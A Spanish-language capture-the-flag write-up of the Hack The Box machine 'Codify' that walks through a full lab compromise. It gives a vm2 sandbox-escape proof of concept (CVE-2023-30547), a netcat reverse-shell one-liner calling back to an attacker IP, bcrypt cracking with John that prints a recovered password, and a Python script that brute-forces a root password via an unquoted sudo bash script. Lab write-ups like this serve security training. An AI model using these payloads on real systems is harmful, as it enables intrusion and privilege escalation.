
# Resumen

Codify es una máquina Linux que ejecuta un servidor HTTP y aloja una aplicación web desactualizada. Aprovecharemos las vulnerabilidades en esta aplicación para acceder al sistema, donde descubriremos credenciales encriptadas en formato bcrypt. Estas credenciales pueden ser explotadas de manera sencilla utilizando John The Ripper. Una vez que hayamos obtenido acceso al usuario Joshua, investigaremos cómo vulnerar un código en bash que cuenta con permisos sudo pero no está implementado con todas las medidas de seguridad necesarias. Esto nos permitirá elevar nuestros privilegios al nivel de root.
# Reconocimiento

## Puertos

Realizamos un escaneo rápido de puertos y versiones de servicios a la máquina víctima:

```shell
└─$ nmap -p- -sV 10.10.11.239 -T5 -oN nmap.txt -vvv
```

![[Pasted image 20231107175436.png]]
## Web

El puerto 80 tiene un servidor http activo: 

![[Pasted image 20231107175901.png]]

A simple vista hay tres páginas: `/limitations`, `/about`, `/editor`.

El servidor contiene una aplicación web que permite testear código Node JS. Una Reverse Shell sencilla en este lenguaje no funciona por los módulos restringidos: 

![[Pasted image 20231107180512.png]]

La aplicación funciona mediante la libreria vm2 en la versión 3.9.16. 

![[Pasted image 20231107180126.png]]
# Penetración 

## Web

La versión 3.9.16 de la librería vm2 tiene una vulnerabilidad registrada como CVE-2023–30547 (https://nvd.nist.gov/vuln/detail/CVE-2023-30547), que permite escapar de las restricciones del editor. Con ello podemos ejecutar código malicioso y una reverse shell con la que acceder al sistema víctima. 
### Exploit

Haremos uso del siguiente PoC: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('whoami');
}
`

console.log(vm.run(code));
```

![[Pasted image 20231107181134.png]]

Una vez confirmada la vulnerabilidad, el acceso es ya algo mecánico. Abrimos puerto en escucha: 

```shell
nc -lvp 4444
```

Introducimos una reverse shell con el siguiente comando (https://www.revshells.com/): 

```shell 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f
```



![[Pasted image 20231107181459.png]]

Una vez dentro, vamos a necesitar, por comodidad, una shell con todas sus funciones. Habrá que ejecutar lo siguiente: 

```shell
script /dev/null -c bash
tty
CTRL+Z
stty raw -echo;fg
reset
xterm
export TERM=xterm
```

En `/home` vemos un usuario posiblemente vulnerable: `joshua`
En `/var/www/contact` hay un archivo SQLite con un hash en bcrypt. 

![[Pasted image 20231107182336.png]]

Con John The Ripper se tarda menos de treinta segundos en hacerse cargo de ella: 

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt
```

`joshua:spongebob1`
# Acceso y Escalada de Privilegios

```shell
ssh joshua@10.10.11.239
```

Aquí está la flag `user.txt`.

Para escalar privilegios vamos a revisar qué puede hacer nuestro usuario Joshua: 

![[Pasted image 20231107182843.png]]

Parece ser que podemos ejecutar un comando con permisos sudo que pregunta por la contraseña root. 

![[Pasted image 20231107183231.png]]

Está programado con ciertas vulnerabilidades de seguridad. Al no estar las variables entre comillas, nos permite realizar que se lean como comandos y no sólo como variables.

El camino fácil es construir un script en python que automatice el trabajo de fuerza bruta. 

```python
import string  
import subprocess  
all = list(string.ascii_letters + string.digits)  
password = ""  
found = False  
  
while not found:  
    for character in all:  
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
        if "Password confirmed!" in output:  
            password += character  
            print(password)  
            break  
    else:  
        found = True
```

Lo creamos en `/tmp`, le damos permisos de ejecución y nos da la contraseña en cuestión de minutos. 

![[Pasted image 20231107183856.png]]